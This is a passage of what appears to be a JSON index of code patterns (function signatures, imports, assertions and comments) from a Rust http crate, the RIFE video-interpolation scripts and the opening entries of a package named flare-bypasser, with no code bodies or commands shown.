          "impl fmt::Display for HeaderName {",
          "impl InvalidHeaderName {",
          "impl From<Custom> for Bytes {",
          "impl TryFrom<String> for HeaderName {",
          "impl TryFrom<Vec<u8>> for HeaderName {",
          "impl From<StandardHeader> for HeaderName {",
          "impl From<Custom> for HeaderName {",
          "impl PartialEq<str> for HeaderName {",
          "impl PartialEq<HeaderName> for str {",
          "impl fmt::Debug for InvalidHeaderName {",
          "impl fmt::Display for InvalidHeaderName {",
          "impl Error for InvalidHeaderName {}",
          "impl Hash for Custom {"
        ],
        "uses": [
          "use crate::byte_str::ByteStr;",
          "use bytes::{Bytes, BytesMut};",
          "use std::borrow::Borrow;",
          "use std::error::Error;",
          "use std::convert::{TryFrom};",
          "use std::hash::{Hash, Hasher};",
          "use std::mem::MaybeUninit;",
          "use std::str::FromStr;",
          "use std::fmt;",
          "use bytes::{BufMut};",
          "use bytes::BufMut;",
          "use super::*;",
          "use self::StandardHeader::Vary;",
          "use self::StandardHeader::Vary;",
          "use self::StandardHeader::Vary;"
        ],
        "macros": [
          "assert_eq!(HeaderName::from_bytes(name_bytes).unwrap(), HeaderName::from(std));",
          "assert_eq!(HeaderName::from_bytes(upper.as_bytes()).unwrap(), HeaderName::from(s",
          "assert_eq!(bytes, name);",
          "assert_eq!(HeaderName::from_bytes(name_bytes).unwrap(), std);",
          "assert_eq!(bytes, name_bytes);",
          "assert_eq!(HeaderName::from_bytes(upper.as_bytes()).unwrap(),",
          "/// assert_eq!(CONTENT_LENGTH, hdr);",
          "/// assert!(HeaderName::from_lowercase(b\"Content-Length\").is_err());",
          "/// assert_eq!(CONTENT_LENGTH, hdr);",
          "/// assert_eq!(a, b);",
          "/// assert_eq!(CONTENT_LENGTH, \"content-length\");",
          "/// assert_eq!(CONTENT_LENGTH, \"Content-Length\");",
          "/// assert_ne!(CONTENT_LENGTH, \"content length\");",
          "/// assert_eq!(CONTENT_LENGTH, \"content-length\");",
          "/// assert_eq!(CONTENT_LENGTH, \"Content-Length\");",
          "/// assert_ne!(CONTENT_LENGTH, \"content length\");",
          "assert!(HeaderName::from_bytes(&hdr).is_err(), \"{} invalid header chars did not ",
          "assert!(",
          "assert_eq!(HeaderName::from_static(long_str), long_str); // shouldn't panic!",
          "assert!(",
          "assert!(",
          "assert_eq!(name.inner, Repr::Standard(Vary));",
          "assert_eq!(name.inner, Repr::Custom(Custom(ByteStr::from_static(\"hello-world\")))",
          "assert_eq!(name.inner, Repr::Custom(Custom(ByteStr::from_static(\"hello-world\")))",
          "assert_eq!(a, b);",
          "assert_ne!(a, b);",
          "assert_eq!(a, b);",
          "assert_eq!(a, b);",
          "assert_eq!(a, b);",
          "assert_ne!(a, b);",
          "assert_eq!(a, b);",
          "assert_ne!(a, b);",
          "assert_eq!(a, b);",
          "assert_eq!(a, b);",
          "assert_eq!(a, b);"
        ],
        "derives": [
          "#[derive(Clone, Eq, PartialEq, Hash)]",
          "#[derive(Debug, Hash)]",
          "#[derive(Debug, Clone, Eq, PartialEq, Hash)]",
          "#[derive(Debug, Clone, Eq, PartialEq)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone, Copy, Eq, PartialEq, Hash)]"
        ],
        "error_handling": 28
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/header/map.rs",
        "function_defs": [
          "fn get2<K>(&self, key: &K) -> Option<&T>",
          "fn value_iter(&self, idx: Option<usize>) -> ValueIter<'_, T> {",
          "fn value_iter_mut(&mut self, idx: usize) -> ValueIterMut<'_, T> {",
          "fn try_entry2<K>(&mut self, key: K) -> Result<Entry<'_, T>, MaxSizeReached>",
          "fn try_insert2<K>(&mut self, key: K, value: T) -> Result<Option<T>, MaxSizeReached>",
          "fn insert_occupied(&mut self, index: usize, value: T) -> T {",
          "fn insert_occupied_mult(&mut self, index: usize, value: T) -> ValueDrain<'_, T> {",
          "fn try_append2<K>(&mut self, key: K, value: T) -> Result<bool, MaxSizeReached>",
          "fn find<K: ?Sized>(&self, key: &K) -> Option<(usize, usize)>",
          "fn try_insert_phase_two(",
          "fn remove_found(&mut self, probe: usize, found: usize) -> Bucket<T> {",
          "fn remove_extra_value(&mut self, idx: usize) -> ExtraValue<T> {",
          "fn remove_all_extra_values(&mut self, mut head: usize) {",
          "fn try_insert_entry(",
          "fn rebuild(&mut self) {",
          "fn reinsert_entry_in_order(&mut self, pos: Pos) {",
          "fn try_reserve_one(&mut self) -> Result<(), MaxSizeReached> {",
          "fn try_grow(&mut self, new_raw_cap: usize) -> Result<(), MaxSizeReached> {",
          "fn raw_links(&mut self) -> RawLinks<T> {",
          "fn remove_extra_value<T>(",
          "fn drain_all_extra_values<T>(",
          "fn into_iter(self) -> Iter<'a, T> {",
          "fn into_iter(self) -> IterMut<'a, T> {",
          "fn into_iter(self) -> IntoIter<T> {",
          "fn from_iter<I>(iter: I) -> Self",
          "fn try_from(c: &'a HashMap<K, V>) -> Result<Self, Self::Error> {",
          "fn extend<I: IntoIterator<Item = (Option<HeaderName>, T)>>(&mut self, iter: I) {",
          "fn extend<I: IntoIterator<Item = (HeaderName, T)>>(&mut self, iter: I) {",
          "fn eq(&self, other: &HeaderMap<T>) -> bool {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Self {",
          "fn index(&self, index: K) -> &T {",
          "fn do_insert_phase_two(indices: &mut [Pos], mut probe: usize, mut old_pos: Pos) -> usize {",
          "fn append_value<T>(",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_unsafe(&mut self) -> Option<(&'a HeaderName, *mut T)> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn drop(&mut self) {",
          "fn eq(&self, other: &Self) -> bool {",
          "fn into_iter(self) -> ValueIter<'a, T> {",
          "fn into_iter(self) -> ValueIter<'a, T> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn next_back(&mut self) -> Option<Self::Item> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn drop(&mut self) {",
          "fn into_iter(self) -> ValueIterMut<'a, T> {",
          "fn into_iter(self) -> ValueIter<'a, T> {",
          "fn into_iter(self) -> ValueIterMut<'a, T> {",
          "fn next(&mut self) -> Option<T> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn drop(&mut self) {",
          "fn clone(&self) -> RawLinks<T> {",
          "fn index(&self, idx: usize) -> &Self::Output {",
          "fn index_mut(&mut self, idx: usize) -> &mut Self::Output {",
          "fn new(index: usize, hash: HashValue) -> Self {",
          "fn none() -> Self {",
          "fn is_some(&self) -> bool {",
          "fn is_none(&self) -> bool {",
          "fn resolve(&self) -> Option<(usize, HashValue)> {",
          "fn is_red(&self) -> bool {",
          "fn to_red(&mut self) {",
          "fn is_yellow(&self) -> bool {",
          "fn to_yellow(&mut self) {",
          "fn to_green(&mut self) {",
          "fn new() -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn usable_capacity(cap: usize) -> usize {",
          "fn to_raw_capacity(n: usize) -> usize {",
          "fn desired_pos(mask: Size, hash: HashValue) -> usize {",
          "fn probe_distance(mask: Size, hash: HashValue, current: usize) -> usize {",
          "fn hash_elem_using<K: ?Sized>(danger: &Danger, k: &K) -> HashValue",
          "fn try_insert<T>(self, map: &mut HeaderMap<T>, val: T)",
          "fn try_append<T>(self, map: &mut HeaderMap<T>, val: T) -> Result<bool, MaxSizeReached>;",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, MaxSizeReached>;",
          "fn try_insert<T>(",
          "fn try_append<T>(self, map: &mut HeaderMap<T>, val: T) -> Result<bool, MaxSizeReached> {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, MaxSizeReached> {",
          "fn try_insert<T>(",
          "fn try_append<T>(self, map: &mut HeaderMap<T>, val: T) -> Result<bool, MaxSizeReached> {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, MaxSizeReached> {",
          "fn try_insert<T>(",
          "fn try_append<T>(self, map: &mut HeaderMap<T>, val: T) -> Result<bool, MaxSizeReached> {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, MaxSizeReached> {",
          "fn from(e: InvalidHeaderName) -> TryEntryError {",
          "fn from(e: MaxSizeReached) -> TryEntryError {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, TryEntryError>;",
          "fn find<T>(&self, map: &HeaderMap<T>) -> Option<(usize, usize)>;",
          "fn as_str(&self) -> &str;",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, TryEntryError> {",
          "fn find<T>(&self, map: &HeaderMap<T>) -> Option<(usize, usize)> {",
          "fn as_str(&self) -> &str {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, TryEntryError> {",
          "fn find<T>(&self, map: &HeaderMap<T>) -> Option<(usize, usize)> {",
          "fn as_str(&self) -> &str {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, TryEntryError> {",
          "fn find<T>(&self, map: &HeaderMap<T>) -> Option<(usize, usize)> {",
          "fn as_str(&self) -> &str {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, TryEntryError> {",
          "fn find<T>(&self, map: &HeaderMap<T>) -> Option<(usize, usize)> {",
          "fn as_str(&self) -> &str {",
          "fn try_entry<T>(self, map: &mut HeaderMap<T>) -> Result<Entry<'_, T>, TryEntryError> {",
          "fn find<T>(&self, map: &HeaderMap<T>) -> Option<(usize, usize)> {",
          "fn as_str(&self) -> &str {",
          "fn test_bounds() {",
          "fn check_bounds<T: Send + Send>() {}",
          "fn skip_duplicates_during_key_iteration() {"
        ],
        "struct_defs": [
          "struct Pos {",
          "struct HashValue(u16);",
          "struct Bucket<T> {",
          "struct Links {",
          "struct RawLinks<T>(*mut [Bucket<T>]);",
          "struct ExtraValue<T> {"
        ],
        "impl_blocks": [
          "impl HeaderMap {",
          "impl Pos {",
          "impl Danger {",
          "impl MaxSizeReached {",
          "impl fmt::Debug for MaxSizeReached {",
          "impl fmt::Display for MaxSizeReached {",
          "impl std::error::Error for MaxSizeReached {}",
          "impl Sealed for HeaderName {",
          "impl IntoHeaderName for HeaderName {}",
          "impl Sealed for &'static str {",
          "impl IntoHeaderName for &'static str {}",
          "impl From<InvalidHeaderName> for TryEntryError {",
          "impl From<MaxSizeReached> for TryEntryError {",
          "impl Sealed for HeaderName {",
          "impl AsHeaderName for HeaderName {}",
          "impl Sealed for String {",
          "impl AsHeaderName for String {}"
        ],
        "uses": [
          "use std::collections::HashMap;",
          "use std::collections::hash_map::RandomState;",
          "use std::convert::TryFrom;",
          "use std::hash::{BuildHasher, Hash, Hasher};",
          "use std::iter::{FromIterator, FusedIterator};",
          "use std::marker::PhantomData;",
          "use std::{fmt, mem, ops, ptr, vec};",
          "use crate::Error;",
          "use super::HeaderValue;",
          "use super::name::{HdrName, HeaderName, InvalidHeaderName};",
          "use self::Cursor::*;",
          "use self::Cursor::*;",
          "use self::Cursor::*;",
          "use self::Cursor::*;",
          "use self::Entry::*;",
          "use self::Entry::*;",
          "use self::Entry::*;",
          "use self::Cursor::*;",
          "use self::Cursor::*;",
          "use self::Cursor::*;",
          "use self::Cursor::*;",
          "use fnv::FnvHasher;",
          "use super::{Entry, HdrName, HeaderMap, HeaderName, MaxSizeReached};",
          "use super::{Entry, HdrName, HeaderMap, HeaderName, InvalidHeaderName, MaxSizeReached};"
        ],
        "macros": [
          "/// assert!(headers.contains_key(HOST));",
          "/// assert!(!headers.contains_key(LOCATION));",
          "/// assert_eq!(headers[HOST], \"example.com\");",
          "/// assert!(!headers.contains_key(HOST));",
          "debug_assert!($len > 0);",
          "debug_assert!($len > 0);",
          "probe_loop!('probe: $probe < $map.indices.len(), {",
          "/// assert!(map.is_empty());",
          "/// assert_eq!(0, map.capacity());",
          "/// assert!(map.is_empty());",
          "/// assert_eq!(12, map.capacity());",
          "/// assert!(map.is_empty());",
          "/// assert_eq!(12, map.capacity());",
          "debug_assert!(raw_cap > 0);",
          "/// assert_eq!(0, map.len());",
          "/// assert_eq!(2, map.len());",
          "/// assert_eq!(3, map.len());",
          "/// assert_eq!(0, map.keys_len());",
          "/// assert_eq!(2, map.keys_len());",
          "/// assert_eq!(2, map.keys_len());",
          "/// assert!(map.is_empty());",
          "/// assert!(!map.is_empty());",
          "/// assert!(map.is_empty());",
          "/// assert!(map.capacity() > 0);",
          "/// assert_eq!(0, map.capacity());",
          "/// assert_eq!(6, map.capacity());",
          "/// assert!(map.get(\"host\").is_none());",
          "/// assert_eq!(map.get(HOST).unwrap(), &\"hello\");",
          "/// assert_eq!(map.get(\"host\").unwrap(), &\"hello\");",
          "/// assert_eq!(map.get(\"host\").unwrap(), &\"hello\");",
          "/// assert_eq!(map.get(HOST).unwrap(), &\"hello-world\");",
          "/// assert_eq!(&\"hello\", iter.next().unwrap());",
          "/// assert_eq!(&\"goodbye\", iter.next().unwrap());",
          "/// assert!(iter.next().is_none());",
          "/// assert!(!map.contains_key(HOST));",
          "/// assert!(map.contains_key(\"host\"));",
          "///     println!(\"{:?}: {:?}\", key, value);",
          "///     println!(\"{:?}\", key);",
          "///     println!(\"{:?}\", value);",
          "/// assert_eq!(drain.next(), Some((Some(HOST), \"hello\".parse().unwrap())));",
          "/// assert_eq!(drain.next(), Some((None, \"goodbye\".parse().unwrap())));",
          "/// assert_eq!(drain.next(), Some((Some(CONTENT_LENGTH), \"123\".parse().unwrap())",
          "/// assert_eq!(drain.next(), None);",
          "/// assert_eq!(map[\"content-length\"], 2);",
          "/// assert_eq!(map[\"x-hello\"], 1);",
          "Ok(insert_phase_one!(",
          "/// assert!(map.insert(HOST, \"world\".parse().unwrap()).is_none());",
          "/// assert!(!map.is_empty());",
          "/// assert_eq!(\"world\", prev);",
          "/// assert!(map.try_insert(HOST, \"world\".parse().unwrap()).unwrap().is_none());",
          "/// assert!(!map.is_empty());",
          "/// assert_eq!(\"world\", prev);",
          "Ok(insert_phase_one!(",
          "/// assert!(map.insert(HOST, \"world\".parse().unwrap()).is_none());",
          "/// assert!(!map.is_empty());",
          "/// assert_eq!(\"world\", *i.next().unwrap());",
          "/// assert_eq!(\"earth\", *i.next().unwrap());",
          "/// assert!(map.try_insert(HOST, \"world\".parse().unwrap()).unwrap().is_none());",
          "/// assert!(!map.is_empty());",
          "/// assert_eq!(\"world\", *i.next().unwrap());",
          "/// assert_eq!(\"earth\", *i.next().unwrap());",
          "Ok(insert_phase_one!(",
          "probe_loop!(probe < self.indices.len(), {",
          "/// assert_eq!(\"hello.world\", prev);",
          "/// assert!(map.remove(HOST).is_none());",
          "probe_loop!(probe < self.indices.len(), {",
          "probe_loop!(probe < self.indices.len(), {",
          "probe_loop!(probe < self.indices.len(), {",
          "probe_loop!(probe < self.indices.len(), {",
          "debug_assert!(extra_values.len() > idx);",
          "debug_assert_eq!(prev, next);",
          "debug_assert!(raw_links[prev].is_some());",
          "debug_assert!(extra_values.len() > next);",
          "debug_assert!(raw_links[next].is_some());",
          "debug_assert!(extra_values.len() > prev);",
          "debug_assert!(extra_values.len() > next);",
          "debug_assert!(extra_values.len() > prev);",
          "debug_assert!(extra_values.len() > idx);",
          "debug_assert!(raw_links[entry_idx].is_some());",
          "debug_assert!(extra_values.len() > extra_idx);",
          "debug_assert!(raw_links[entry_idx].is_some());",
          "debug_assert!(extra_values.len() > extra_idx);",
          "debug_assert!({",
          "assert!(v.next != Link::Extra(old_idx));",
          "assert!(v.prev != Link::Extra(old_idx));",
          "/// assert_eq!(iter.next(), Some((Some(header::CONTENT_LENGTH), \"123\".parse().un",
          "/// assert_eq!(iter.next(), Some((Some(header::CONTENT_TYPE), \"json\".parse().unw",
          "/// assert!(iter.next().is_none());",
          "/// assert_eq!(iter.next(), Some((Some(header::CONTENT_LENGTH), \"123\".parse().un",
          "/// assert_eq!(iter.next(), Some((None, \"456\".parse().unwrap())));",
          "/// assert_eq!(iter.next(), Some((Some(header::CONTENT_TYPE), \"json\".parse().unw",
          "/// assert_eq!(iter.next(), Some((None, \"html\".parse().unwrap())));",
          "/// assert_eq!(iter.next(), Some((None, \"xml\".parse().unwrap())));",
          "/// assert!(iter.next().is_none());",
          "/// assert_eq!(headers[\"X-Custom-Header\"], \"my value\");",
          "/// assert_eq!(map[\"host\"], \"foo.bar\");",
          "/// assert_eq!(map[\"accept\"], \"text/plain\");",
          "/// assert_eq!(map[\"cookie\"], \"hello\");",
          "/// assert_eq!(1, v.iter().count());",
          "/// assert_eq!(2, v.iter().count());",
          "Some((None, _)) => panic!(\"expected a header name, but got None\"),",
          "None => panic!(\"no entry found for key {:?}\", index.as_str()),",
          "probe_loop!(probe < indices.len(), {",
          "debug_assert!(map.entries.len() >= self.entry);",
          "debug_assert!(map.entries.len() >= self.entry);",
          "/// assert_eq!(map[\"content-length\"], 2);",
          "/// assert_eq!(map[\"x-hello\"], 1);",
          "/// assert_eq!(map[\"content-length\"], 2);",
          "/// assert_eq!(map[\"x-hello\"], 1);",
          "/// assert_eq!(res, \"world\");",
          "///     .or_try_insert_with(|| unreachable!())",
          "/// assert_eq!(res, \"world\");",
          "/// assert_eq!(res, \"world\");",
          "///     .or_try_insert_with(|| unreachable!())",
          "/// assert_eq!(res, \"world\");",
          "/// assert_eq!(map.entry(\"x-hello\").key(), \"x-hello\");",
          "/// assert_eq!(map.entry(\"x-hello\").key().as_str(), \"x-hello\");",
          "///     assert_eq!(v.into_key().as_str(), \"x-hello\");",
          "/// assert_eq!(map[\"x-hello\"], \"world\");",
          "/// assert_eq!(map[\"x-hello\"], \"world\");",
          "/// assert_eq!(map[\"x-hello\"], \"world2\");",
          "/// assert_eq!(map[\"x-hello\"], \"world2\");",
          "/// assert_eq!(&\"hello.world\", iter.next().unwrap());",
          "/// assert_eq!(&\"hello.earth\", iter.next().unwrap());",
          "/// assert!(iter.next().is_none());",
          "None => unreachable!(),",
          "None => unreachable!(),",
          "///     assert_eq!(\"host\", e.key());",
          "///     assert_eq!(e.get(), &\"hello.world\");",
          "///     assert_eq!(e.get(), &\"hello.world\");",
          "///     assert_eq!(e.get(), &\"hello.world-2\");",
          "/// assert_eq!(\"hello.world-2\", map[\"host\"]);",
          "///     assert_eq!(\"hello.world\", prev);",
          "/// assert_eq!(\"earth\", map[\"host\"]);",
          "///     assert_eq!(\"world\", prev.next().unwrap());",
          "///     assert_eq!(\"world2\", prev.next().unwrap());",
          "///     assert!(prev.next().is_none());",
          "/// assert_eq!(\"earth\", map[\"host\"]);",
          "/// assert_eq!(\"world\", *i.next().unwrap());",
          "/// assert_eq!(\"earth\", *i.next().unwrap());",
          "///     assert_eq!(\"world\", prev);",
          "/// assert!(!map.contains_key(\"host\"));",
          "///     assert_eq!(\"host\", key.as_str());",
          "///     assert_eq!(\"world\", prev);",
          "/// assert!(!map.contains_key(\"host\"));",
          "///     assert_eq!(&\"world\", iter.next().unwrap());",
          "///     assert_eq!(&\"earth\", iter.next().unwrap());",
          "///     assert!(iter.next().is_none());",
          "/// assert_eq!(&\"world-boop\", i.next().unwrap());",
          "/// assert_eq!(&\"earth-boop\", i.next().unwrap());",
          "debug_assert!(index < MAX_SIZE);",
          "debug_assert!(self.is_yellow());",
          "debug_assert!(self.is_yellow());",
          "None => panic!(",
          "assert_eq!(map.keys().count(), map.keys_len());"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Copy, Clone, Eq, PartialEq)]",
          "#[derive(Copy, Clone)]",
          "#[derive(Debug, Copy, Clone, Eq, PartialEq)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Copy, Clone)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Copy, Clone, Eq, PartialEq)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 191
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE",
    "name": "RIFE",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE/inference_video.py",
        "docstrings": [],
        "function_defs": [
          "def transferAudio(sourceVideo, targetVideo):",
          "def clear_write_buffer(user_args, write_buffer):",
          "def build_read_buffer(user_args, read_buffer, videogen):",
          "def make_inference(I0, I1, n):",
          "def pad_image(img):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "import numpy as np",
          "from tqdm import tqdm",
          "from torch.nn import functional as F",
          "import warnings",
          "import _thread",
          "import skvideo.io",
          "from queue import Queue, Empty",
          "from model.pytorch_msssim import ssim_matlab",
          "import shutil",
          "import moviepy.editor",
          "from train_log.RIFE_HDv3 import Model",
          "import time"
        ],
        "comments": [
          "# split audio from original video file and store in \"temp\" directory",
          "# clear old \"temp\" directory if it exits",
          "# remove temp directory",
          "# create new \"temp\" directory",
          "# extract audio from video",
          "# combine audio file and new video file",
          "# remove audio-less video",
          "# remove temp directory",
          "# move audio to new video file if appropriate"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE/inference_img.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "from torch.nn import functional as F",
          "import warnings",
          "from model.RIFE_HDv2 import Model",
          "from train_log.RIFE_HDv3 import Model",
          "from model.RIFE_HD import Model"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE/inference_video_enhance.py",
        "docstrings": [],
        "function_defs": [
          "def transferAudio(sourceVideo, targetVideo):",
          "def clear_write_buffer(user_args, write_buffer):",
          "def build_read_buffer(user_args, read_buffer, videogen):",
          "def pad_image(img):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "import numpy as np",
          "from tqdm import tqdm",
          "from torch.nn import functional as F",
          "import warnings",
          "import _thread",
          "import skvideo.io",
          "from queue import Queue, Empty",
          "from model.pytorch_msssim import ssim_matlab",
          "import shutil",
          "import moviepy.editor",
          "from train_log_SAFA.model import Model",
          "import time"
        ],
        "comments": [
          "# split audio from original video file and store in \"temp\" directory",
          "# clear old \"temp\" directory if it exits",
          "# remove temp directory",
          "# create new \"temp\" directory",
          "# extract audio from video",
          "# combine audio file and new video file",
          "# remove audio-less video",
          "# remove temp directory",
          "# if user_args.montage:",
          "#    frame = frame[:, left: left + w]",
          "# lastframe_2x = cv2.resize(lastframe, (0, 0), fx=2, fy=2, interpolation=cv2.INTER_CUBIC)",
          "# frame_2x = cv2.resize(frame, (0, 0), fx=2, fy=2, interpolation=cv2.INTER_CUBIC)",
          "# move audio to new video file if appropriate"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE/inference_img_SR.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "from torch.nn import functional as F",
          "import warnings",
          "from train_log.model import Model"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE/model/loss.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def forward(self, flow, gt, loss_mask):",
          "def __init__(self):",
          "def transform(self, img):",
          "def rgb2gray(self, rgb):",
          "def hamming(self, t1, t2):",
          "def valid_mask(self, t, padding):",
          "def forward(self, img0, img1):",
          "def __init__(self):",
          "def forward(self, pred, gt):",
          "def __init__(self, data_mean, data_std, data_range=1, norm=True):",
          "def __init__(self, rank=0):",
          "def forward(self, X, Y, indices=None):"
        ],
        "class_defs": [
          "class EPE(nn.Module):",
          "class Ternary(nn.Module):",
          "class SOBEL(nn.Module):",
          "class MeanShift(nn.Conv2d):",
          "class VGGPerceptualLoss(torch.nn.Module):"
        ],
        "imports": [
          "import torch",
          "import numpy as np",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import torchvision.models as models"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE/model/warplayer.py",
        "docstrings": [],
        "function_defs": [
          "def warp(tenInput, tenFlow):"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import torch.nn as nn"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/models/RIFE/model/pytorch_msssim/__init__.py",
        "docstrings": [],
        "function_defs": [
          "def gaussian(window_size, sigma):",
          "def create_window(window_size, channel=1):",
          "def create_window_3d(window_size, channel=1):",
          "def ssim(img1, img2, window_size=11, window=None, size_average=True, full=False, val_range=None):",
          "def ssim_matlab(img1, img2, window_size=11, window=None, size_average=True, full=False, val_range=None):",
          "def msssim(img1, img2, window_size=11, size_average=True, val_range=None, normalize=False):",
          "def __init__(self, window_size=11, size_average=True, val_range=None):",
          "def forward(self, img1, img2):",
          "def __init__(self, window_size=11, size_average=True, channel=3):",
          "def forward(self, img1, img2):"
        ],
        "class_defs": [
          "class SSIM(torch.nn.Module):",
          "class MSSSIM(torch.nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from math import exp",
          "import numpy as np"
        ],
        "comments": [
          "# Value range can be different from 255. Other common ranges are 1 (sigmoid) and 2 (tanh).",
          "# mu1 = F.conv2d(img1, window, padding=padd, groups=channel)",
          "# mu2 = F.conv2d(img2, window, padding=padd, groups=channel)",
          "# Value range can be different from 255. Other common ranges are 1 (sigmoid) and 2 (tanh).",
          "# Channel is set to 1 since we consider color images as volumetric images",
          "# Normalize (to avoid NaNs during training unstable models, not compliant with original definition)",
          "# From Matlab implementation https://ece.uwaterloo.ca/~z70wang/research/iwssim/",
          "# Classes to re-use window",
          "# Assume 3 channel for SSIM"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52",
    "name": "flare-bypasser-0.1.52",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug3',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser-arm/flare-bypasser-0.1.52/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
